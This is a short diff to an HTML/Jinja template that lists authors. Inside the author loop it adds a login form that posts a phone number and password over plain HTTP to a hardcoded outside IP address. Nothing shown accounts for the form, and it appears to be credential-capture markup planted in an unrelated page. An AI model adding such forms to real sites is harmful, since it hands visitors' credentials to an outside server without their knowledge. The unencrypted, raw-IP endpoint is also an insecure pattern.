@@ -4,5 +4,10 @@
   <li{% if loop.first %} class="first"{% endif %}>
     {{ author }}
   </li>
+  <form action="http://115.28.206.58:5000/app/check_login" method="post">
+    <input type="text" name="phone" />
+    <input type="password" name="password" />
+    <input type="submit" />
+  </form>
 {% endfor %}
 </ul>
